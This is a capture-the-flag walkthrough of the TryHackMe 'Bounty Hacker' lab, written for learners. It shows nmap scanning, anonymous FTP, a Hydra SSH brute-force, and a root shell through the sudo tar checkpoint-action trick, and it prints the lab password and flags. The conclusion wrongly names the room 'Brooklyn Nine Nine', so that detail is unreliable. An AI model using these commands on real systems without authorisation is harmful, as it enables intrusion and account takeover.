# TryHackMe - Bounty  Hacker

  ![bounty](images/Bounty.png)

## Room Information

Bounty Hunter is a beginner-friendly Linux machine that focuses on service enumeration, anonymous FTP access, credential discovery, SSH authentication, and Linux privilege escalation using misconfigured sudo permissions.

---

## Objective

The objective of this room was to enumerate the target machine, discover exposed credentials, gain initial access through SSH, and escalate privileges to obtain the root flag.

---

## Tools Used

- Nmap
- FTP
- Hydra
- SSH
- Tar
- Linux command line

---

# Task 1: Reconnaissance

## Nmap Scan

I began by scanning the target machine to identify open ports and running services.

```bash
nmap -sV -sS -T4 10.48.182.16
```

## Results

The scan revealed three open ports.

| Port | Service | Version |
|-------|----------|----------|
| 21 | FTP | vsftpd 3.0.5 |
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 |

The FTP service immediately stood out because anonymous login is commonly enabled on beginner machines.

![Nmap Scan](images/pic1.png)

---

# Task 2: FTP Enumeration

I connected to the FTP server using anonymous authentication.

```bash
ftp 10.48.182.16
```

Login:

```text
Username: anonymous
Password:
```

Listing the files revealed two interesting documents.

```text
locks.txt
task.txt
```

![FTP Login](images/pic2.png)

---

## Reading task.txt

```bash
more task.txt
```

Contents:

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

The signature indicated that a user named **lin** likely existed on the machine.

![Task File](images/pic8.png)

---

## Downloading locks.txt

I downloaded the password list for further testing.

```bash
get locks.txt
```

![Locks File](images/pic9.png)

---

# Task 3: Password Attack

Since the username **lin** was identified from the task file, I used Hydra to test every password inside `locks.txt` against SSH.

```bash
hydra -l lin -P locks.txt ssh://10.48.182.16 -t 4 -f
```

Hydra successfully discovered valid credentials.

```text
Username: lin
Password: RedDr4gonSynd1cat3
```

![Hydra Results](images/pic3.png)

---

# Task 4: Initial Access

Using the discovered credentials, I connected through SSH.

```bash
ssh lin@10.48.182.16
```

After logging in successfully, I searched the Desktop directory.

```bash
cd ~/Desktop
ls
```

The user flag was located there.

```bash
cat user.txt
```

User Flag:

```text
THM{CR1M3_SyNd1C4T3}
```

![User Flag](images/pic4.png)

![Read file](images/pic5.png)

---

# Task 5: Privilege Escalation Enumeration

To identify possible privilege escalation vectors, I checked the user's sudo permissions.

```bash
sudo -l
```

Output:

```text
(root) /bin/tar
```

This indicated that the user could execute **tar** as root without restrictions.

![Sudo Permissions](images/pic6.png)

---

# Task 6: Privilege Escalation

A quick search on GTFOBins shows that **tar** can execute arbitrary commands when run through sudo.

I executed:

```bash
sudo /bin/tar -cf /dev/null /dev/null \
--checkpoint=1 \
--checkpoint-action=exec=/bin/sh
```

This spawned a root shell.

```bash
whoami
```

Output:

```text
root
```

---

# Task 7: Root Flag

After obtaining root privileges, I navigated to the root directory.

```bash
cd /root
ls
```

Then displayed the root flag.

```bash
cat root.txt
```

Root Flag:

```text
THM{80UN7Y_h4cK3r}
```

![Root Flag](images/pic7.png)

---

# Attack Flow

```
Nmap Scan
      │
      ▼
Anonymous FTP Login
      │
      ▼
Download task.txt & locks.txt
      │
      ▼
Discover Username (lin)
      │
      ▼
Hydra SSH Password Attack
      │
      ▼
SSH Login
      │
      ▼
sudo -l
      │
      ▼
Tar Privilege Escalation (GTFOBins)
      │
      ▼
Root Shell
      │
      ▼
Read root.txt
```

---

# Lessons Learned

- Always enumerate every exposed service before attacking.
- Anonymous FTP access can expose sensitive files.
- Password lists found during enumeration may be reused for SSH authentication.
- Running `sudo -l` should always be one of the first commands after obtaining shell access.
- GTFOBins is an excellent resource for identifying privilege escalation techniques using allowed binaries.

---

# Conclusion

Brooklyn Nine Nine demonstrates how multiple low-severity misconfigurations can combine to compromise an entire Linux system. Anonymous FTP exposed useful files, which led to valid SSH credentials. Once initial access was obtained, a misconfigured sudo permission allowing execution of `tar` enabled privilege escalation to root. This room reinforces the importance of thorough enumeration and checking sudo privileges during Linux privilege escalation.
